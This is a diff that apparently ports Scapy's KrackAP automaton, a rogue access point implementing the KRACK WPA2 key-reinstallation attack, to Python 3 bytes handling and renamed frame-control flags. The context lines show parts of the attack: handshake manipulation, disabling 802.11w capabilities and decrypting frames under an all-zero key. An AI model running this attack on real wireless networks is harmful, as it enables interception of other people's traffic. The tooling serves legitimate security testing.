@@ -11,7 +11,7 @@ from cryptography.hazmat.backends import default_backend
 from scapy.automaton import ATMT, Automaton
 from scapy.base_classes import Net
 from scapy.config import conf
-from scapy.compat import raw, hex_bytes, chb
+from scapy.compat import raw, chb
 from scapy.consts import WINDOWS
 from scapy.error import log_runtime, Scapy_Exception
 from scapy.layers.dot11 import RadioTap, Dot11, Dot11AssoReq, Dot11AssoResp, \
@@ -21,7 +21,7 @@ from scapy.layers.eap import EAPOL
 from scapy.layers.l2 import ARP, LLC, SNAP, Ether
 from scapy.layers.dhcp import DHCP_am
 from scapy.packet import Raw
-from scapy.utils import hexdump
+from scapy.utils import hexdump, mac2str
 from scapy.volatile import RandBin
 
 
@@ -183,8 +183,8 @@ class KrackAP(Automaton):
         pmk = self.pmk
         anonce = self.anonce
         snonce = client_nonce
-        amac = hex_bytes(self.mac.replace(":", ""))
-        smac = hex_bytes(self.client.replace(":", ""))
+        amac = mac2str(self.mac)
+        smac = mac2str(self.client)
 
         # Compute PTK
         self.ptk = customPRF512(pmk, amac, smac, anonce, snonce)
@@ -327,7 +327,7 @@ class KrackAP(Automaton):
             addr1=dest,
             addr2=self.mac,
             addr3=self.mac,
-            FCfield="+".join(['wep'] + additionnal_flag),
+            FCfield="+".join(['protected'] + additionnal_flag),
             SC=(next(self.seq_num) << 4),
             subtype=0,
             type="Data",
@@ -509,7 +509,7 @@ class KrackAP(Automaton):
         temp_pkt.remove_payload()
         self.RSN = raw(temp_pkt)
         # Avoid 802.11w, etc. (deactivate RSN capabilities)
-        self.RSN = self.RSN[:-2] + "\x00\x00"
+        self.RSN = self.RSN[:-2] + b"\x00\x00"
 
         rep = RadioTap()
         rep /= Dot11(addr1=self.client, addr2=self.mac, addr3=self.mac)
@@ -551,7 +551,7 @@ class KrackAP(Automaton):
         if RadioTap not in pkt:
             return
         if EAPOL in pkt and pkt.addr1 == pkt.addr3 == self.mac and \
-           pkt[EAPOL].load[1] == "\x01":
+           pkt[EAPOL].load[1:2] == b"\x01":
             # Key MIC: set, Secure / Error / Request / Encrypted / SMK
             # message: not set
             raise self.WPA_HANDSHAKE_STEP_3_SENT().action_parameters(pkt)
@@ -568,7 +568,7 @@ class KrackAP(Automaton):
         # Data: full message with MIC place replaced by 0s
         # https://stackoverflow.com/questions/15133797/creating-wpa-message-integrity-code-mic-with-python
         client_mic = pkt[EAPOL].load[77:77 + 16]
-        client_data = raw(pkt[EAPOL]).replace(client_mic, "\x00" * len(client_mic))  # noqa: E501
+        client_data = raw(pkt[EAPOL]).replace(client_mic, b"\x00" * len(client_mic))  # noqa: E501
         assert hmac.new(self.kck, client_data, hashlib.md5).digest() == client_mic  # noqa: E501
 
         rep = RadioTap()
@@ -604,7 +604,7 @@ class KrackAP(Automaton):
         if RadioTap not in pkt:
             return
         if EAPOL in pkt and pkt.addr1 == pkt.addr3 == self.mac and \
-           pkt[EAPOL].load[1:3] == "\x03\x09":
+           pkt[EAPOL].load[1:3] == b"\x03\x09":
             self.time_handshake_end = time.time()
             raise self.KRACK_DISPATCHER()
 
@@ -682,8 +682,8 @@ class KrackAP(Automaton):
         if pkt[Dot11].FCfield.retry:
             return
 
-        # Skip unencrypted frames (TKIP rely on WEP packet)
-        if not pkt[Dot11].FCfield.wep:
+        # Skip unencrypted frames (TKIP rely on encrypted packets)
+        if not pkt[Dot11].FCfield.protected:
             return
 
         # Dot11.type 2: Data
@@ -720,9 +720,9 @@ class KrackAP(Automaton):
 
         # Decoding with a 0's TK
         if data_clear is None:
-            data = parse_data_pkt(pkt, "\x00" * len(self.tk))
+            data = parse_data_pkt(pkt, b"\x00" * len(self.tk))
             try:
-                mic_key = "\x00" * len(self.mic_sta_to_ap)
+                mic_key = b"\x00" * len(self.mic_sta_to_ap)
                 data_clear = check_MIC_ICV(data, mic_key, pkt.addr2, pkt.addr3)
                 log_runtime.warning("Client has installed an all zero "
                                     "encryption key (TK)!!")
@@ -778,8 +778,8 @@ class KrackAP(Automaton):
         if pkt[Dot11].FCfield.retry:
             return
 
-        # Skip unencrypted frames (TKIP rely on WEP packet)
-        if not pkt[Dot11].FCfield.wep:
+        # Skip unencrypted frames (TKIP rely on encrypted packets)
+        if not pkt[Dot11].FCfield.protected:
             return
 
         # Normal decoding
@@ -795,7 +795,7 @@ class KrackAP(Automaton):
 
         pkt_clear = LLC(data_clear)
         if EAPOL in pkt_clear and pkt.addr1 == pkt.addr3 == self.mac and \
-           pkt_clear[EAPOL].load[1:3] == "\x03\x01":
+           pkt_clear[EAPOL].load[1:3] == b"\x03\x01":
             raise self.WAIT_ARP_REPLIES()
 
     @ATMT.action(get_gtk_2)
@@ -853,8 +853,8 @@ class KrackAP(Automaton):
         if pkt[Dot11].FCfield.retry:
             return
 
-        # Skip unencrypted frames (TKIP rely on WEP packet)
-        if not pkt[Dot11].FCfield.wep:
+        # Skip unencrypted frames (TKIP rely on encrypted packets)
+        if not pkt[Dot11].FCfield.protected:
             return
 
         # Dot11.type 2: Data
